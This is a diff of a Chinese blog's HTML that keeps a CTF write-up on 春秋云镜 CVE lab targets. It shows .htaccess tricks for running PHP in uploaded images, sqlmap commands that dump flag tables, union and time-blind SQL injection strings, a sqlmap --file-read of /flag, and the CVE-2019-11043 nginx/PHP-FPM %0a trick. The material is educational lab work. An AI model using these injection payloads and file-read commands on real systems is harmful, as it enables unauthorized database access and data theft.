+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php <span class="string">.jpeg</span> <span class="string">.png</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>AddType 指令可以将给定的文件扩展名映射到指定的内容类型。</strong></p>
 <p>这个指令的主要作用是文件上传时候如果我们上传一个后缀为png或者jpeg的文件，当它们被访问时，应该用PHP解析器来解析。意味着我们可以通过在这些后缀的文件中插入恶意php代码去达到我们的进攻目的</p>
@@ -211,7 +355,7 @@
 </ul>
 <p>或者也可以这样设置</p>
 <p><strong>SetHandler指令</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
 
 <p><strong>SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理。</strong></p>
 <p>这个指令的主要作用是告诉 Apache，任何匹配的文件都应该通过 PHP 处理器来处理。当前目录及其子目录下所有文件都会被当做 php 解析。</p>
@@ -255,17 +399,17 @@
 <p>登录界面随便注册一个账号后登入</p>
 <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206004644473.png" alt="image-20250206004644473"></p>
 <p>进入之后我们观察url，发现我们此时就在welcome.php，并且url后面跟着一个参数q，随便点击一个start看到出现了很多参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://eci-<span class="number">2</span>ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=<span class="number">2</span>&amp;eid=<span class="number">60377</span>db362694&amp;n=<span class="number">1</span>&amp;t=<span class="number">34</span></span><br></pre></td></tr></table></figure>
 
 <p>直接拖到sqlmap里面测试一下注入点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &#x27;http://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> sqlmap.py -u &#x27;http://eci-<span class="number">2</span>ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=<span class="number">2</span>&amp;eid=<span class="number">60377</span>db362694&amp;n=<span class="number">1</span>&amp;t=<span class="number">34</span>&#x27;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250206010047702.png" alt="image-20250206010047702"></p>
 <p>后面直接一把梭就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &#x27;http://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&#x27; -D ctf -T flag -C flag --dump --batch</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> sqlmap.py -u &#x27;http://eci-<span class="number">2</span>ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=<span class="number">2</span>&amp;eid=<span class="number">60377</span>db362694&amp;n=<span class="number">1</span>&amp;t=<span class="number">34</span>&#x27; -D ctf -T flag -C flag --dump --batch</span><br></pre></td></tr></table></figure>
 
 <p>等待的同时我们也可以手工测一下发现是时间盲注</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&#x27; or sleep(0.3)--+&amp;n=1&amp;t=34</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://eci-<span class="number">2</span>ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=<span class="number">2</span>&amp;eid=<span class="number">60377</span>db362694&#x27; or sleep(<span class="number">0</span>.<span class="number">3</span>)--+&amp;n=<span class="number">1</span>&amp;t=<span class="number">34</span></span><br></pre></td></tr></table></figure>
 
 <p>一开始选的时间太大导致睡死了，后面调到0.3的话差不多6s左右</p>
 <h2 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h2><h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="#SQL联合注入"></a>#SQL联合注入</h3><p>Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。</p>
@@ -290,7 +434,7 @@
 <p>使用cookie参数可以绕过身份验证，添加user-agent参数可以绕过客户端验证，否则可能会被识别到明显的sqlmap客户端标识，从而导致攻击的中断</p>
 <p>当然也是可以直接手搓的(建议手搓加深印象)</p>
 <p>过滤字符:#,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/single.php?id=1&#x27; order by 10--+出现错误，判断字段数为10</span><br><span class="line">/single.php?id=-1&#x27; union select 1,2,3,4,5,6,7,8,9--+发现回显位置2和4</span><br><span class="line">/single.php?id=-1&#x27; union select 1,database(),3,4,5,6,7,8,9--+爆数据库</span><br><span class="line">/single.php?id=-1%27union%20select%201,2,3,group_concat(table_name),5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=%27ctf%27--+爆表名</span><br><span class="line">/single.php?id=-1%27union%20select%201,2,3,group_concat(column_name),5,6,7,8,9%20from%20information_schema.columns%20where%20table_name=%27flag%27--+爆字段名</span><br><span class="line">/single.php?id=-1%27%20union%20select%201,database(),3,group_concat(flag),5,6,7,8,9%20from%20flag--+爆数据</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/single.php?id<span class="operator">=</span><span class="number">1</span>&#x27; order by <span class="number">10</span>--+出现错误，判断字段数为<span class="number">10</span></span><br><span class="line">/single.php?id<span class="operator">=</span><span class="number">-1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span><span class="number">3</span><span class="punctuation">,</span><span class="number">4</span><span class="punctuation">,</span><span class="number">5</span><span class="punctuation">,</span><span class="number">6</span><span class="punctuation">,</span><span class="number">7</span><span class="punctuation">,</span><span class="number">8</span><span class="punctuation">,</span><span class="number">9</span>--+发现回显位置<span class="number">2</span>和<span class="number">4</span></span><br><span class="line">/single.php?id<span class="operator">=</span><span class="number">-1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span><span class="punctuation">,</span>database()<span class="punctuation">,</span><span class="number">3</span><span class="punctuation">,</span><span class="number">4</span><span class="punctuation">,</span><span class="number">5</span><span class="punctuation">,</span><span class="number">6</span><span class="punctuation">,</span><span class="number">7</span><span class="punctuation">,</span><span class="number">8</span><span class="punctuation">,</span><span class="number">9</span>--+爆数据库</span><br><span class="line">/single.php?id<span class="operator">=</span><span class="number">-1</span><span class="variable">%27</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span><span class="number">3</span><span class="punctuation">,</span>group_concat(table_name)<span class="punctuation">,</span><span class="number">5</span><span class="punctuation">,</span><span class="number">6</span><span class="punctuation">,</span><span class="number">7</span><span class="punctuation">,</span><span class="number">8</span><span class="punctuation">,</span><span class="number">9</span><span class="variable">%20</span>from<span class="variable">%20</span>information_schema.tables<span class="variable">%20</span>where<span class="variable">%20</span>table_schema<span class="operator">=</span><span class="variable">%27</span>ctf<span class="variable">%27</span>--+爆表名</span><br><span class="line">/single.php?id<span class="operator">=</span><span class="number">-1</span><span class="variable">%27</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span><span class="number">3</span><span class="punctuation">,</span>group_concat(column_name)<span class="punctuation">,</span><span class="number">5</span><span class="punctuation">,</span><span class="number">6</span><span class="punctuation">,</span><span class="number">7</span><span class="punctuation">,</span><span class="number">8</span><span class="punctuation">,</span><span class="number">9</span><span class="variable">%20</span>from<span class="variable">%20</span>information_schema.columns<span class="variable">%20</span>where<span class="variable">%20</span>table_name<span class="operator">=</span><span class="variable">%27</span>flag<span class="variable">%27</span>--+爆字段名</span><br><span class="line">/single.php?id<span class="operator">=</span><span class="number">-1</span><span class="variable">%27</span><span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span>database()<span class="punctuation">,</span><span class="number">3</span><span class="punctuation">,</span>group_concat(flag)<span class="punctuation">,</span><span class="number">5</span><span class="punctuation">,</span><span class="number">6</span><span class="punctuation">,</span><span class="number">7</span><span class="punctuation">,</span><span class="number">8</span><span class="punctuation">,</span><span class="number">9</span><span class="variable">%20</span>from<span class="variable">%20</span>flag--+爆数据</span><br></pre></td></tr></table></figure>
 
 <p>注意这里联合注入的时候需要用-1，不然找不到注入点</p>
 <h2 id="CVE-2022-28060"><a href="#CVE-2022-28060" class="headerlink" title="CVE-2022-28060"></a>CVE-2022-28060</h2><h3 id="SQL注入读取文件"><a href="#SQL注入读取文件" class="headerlink" title="#SQL注入读取文件"></a>#SQL注入读取文件</h3><p>CVE-2022-28060 是 Victor CMS v1.0 中的一个SQL注入漏洞。该漏洞存在于 &#x2F;includes&#x2F;login.php 文件中的 user_name 参数。攻击者可以通过发送特制的 SQL 语句，利用这个漏洞执行未授权的数据库操作，从而访问或修改数据库中的敏感信息。</p>
@@ -304,7 +448,7 @@
 <p>打开后在登录框随便输入然后抓包(不知道为啥开bp代理后页面就是空白的，好不容易抓到的包)</p>
 <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250219203108253.png" alt="image-20250219203108253"></p>
 <p>可以看到是post请求包，直接保存请求包内容为txt文件然后用sqlmap跑一下看看需不需要伪造验证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt --batch</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap<span class="selector-class">.py</span> -<span class="attribute">r</span> <span class="number">1</span><span class="selector-class">.txt</span> <span class="attr">--batch</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250219203405902.png" alt="image-20250219203405902"></p>
 <p>找到注入点user_name，爆一下数据库</p>
@@ -312,7 +456,7 @@
 <p>没有明显的flag相关的数据库名，考虑是否需要读写文件</p>
 <p>我们知道SQL注入漏洞除了可以对数据库进行数据的查询之外，还可以对的服务器的文件进行读写操作。</p>
 <p>在mysql中读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py --batch -D &quot;mysql&quot; --file-read &quot;/flag&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> sqlmap.<span class="keyword">py</span> --batch -D <span class="string">&quot;mysql&quot;</span> --<span class="keyword">file</span>-<span class="keyword">read</span> <span class="string">&quot;/flag&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>然后cat读取文件就行</p>
 <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250219211027136.png" alt="image-20250219211027136"></p>
@@ -331,7 +475,7 @@
 <p><strong>利用条件：</strong>nginx配置了fastcgi_split_path_info</p>
 <p><strong>受影响系统：</strong>PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p>
 <p>那我们先来看一下nginx.conf中的具体配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:9000;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ <span class="selector-attr">[^/]</span>\<span class="selector-class">.php</span>(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>解释一下</p>
 <p><code>fastcgi_split_path_info ^(.+?\.php)(/.*)$;</code></p>
@@ -348,164 +492,117 @@
 <p>这一行将 Nginx 解析出的路径信息传递给 PHP-FPM，作为 <code>PATH_INFO</code> 环境变量。PHP 可以通过 <code>$_SERVER[&#39;PATH_INFO&#39;]</code> 访问这个值。</p>
 <p>此时我们可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">H0me</a></li>
-        
-          <li><a href="/about/">A6out</a></li>
-        
-          <li><a href="/tags/">T6gs</a></li>
-        
-          <li><a href="/categories/">Catagory</a></li>
-        
-          <li><a href="/links/">L1nks</a></li>
-        
-          <li><a href="/search/">s4arch</a></li>
-        
-      </ul>
     </div>
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-25578"><span class="toc-number">1.</span> <span class="toc-text">CVE-2022-25578</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.</span> <span class="toc-text">#RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Taocms"><span class="toc-number">1.2.</span> <span class="toc-text">Taocms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">.htaccess文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">.htaccess 常见指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-32991"><span class="toc-number">2.</span> <span class="toc-text">CVE-2022-32991</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">#SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-28512"><span class="toc-number">3.</span> <span class="toc-text">CVE-2022-28512</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">#SQL联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-28060"><span class="toc-number">4.</span> <span class="toc-text">CVE-2022-28060</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">#SQL注入读取文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-36104"><span class="toc-number">5.</span> <span class="toc-text">CVE-2024-36104</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">5.1.</span> <span class="toc-text">#目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-11043"><span class="toc-number">6.</span> <span class="toc-text">CVE-2019-11043</span></a></li></ol>
-      </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&text=春秋CVE刷题学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&is_video=false&description=春秋CVE刷题学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=春秋CVE刷题学习&body=Check out this article: https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&title=春秋CVE刷题学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&name=春秋CVE刷题学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/&t=春秋CVE刷题学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
 
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/02/05/%E6%98%A5%E7%A7%8BCVE%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/" title="春秋CVE刷题学习">https://wanth3f1ag.top/2025/02/05/春秋CVE刷题学习/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/cve/" rel="tag"># cve</a>
+          </div>
+
         
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2025
-        wanTh3flag
-        <br>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/01/27/web%E5%85%A5%E9%97%A8SSTI%E7%AF%87-ctfshow/" rel="prev" title="web入门SSTI篇--ctfshow">
+                  <i class="fa fa-angle-left"></i> web入门SSTI篇--ctfshow
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/02/07/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/" rel="next" title="SSRF的一些学习">
+                  SSRF的一些学习 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45:12</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
     </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">H0me</a></li><!--
-                --><!--
-                --><li><a href="/about/">A6out</a></li><!--
-                --><!--
-                --><li><a href="/tags/">T6gs</a></li><!--
-                --><!--
-                --><li><a href="/categories/">Catagory</a></li><!--
-                --><!--
-                --><li><a href="/links/">L1nks</a></li><!--
-                --><!--
-                --><li><a href="/search/">s4arch</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
-    </div>
-</footer>
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  </footer>
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
 </html>
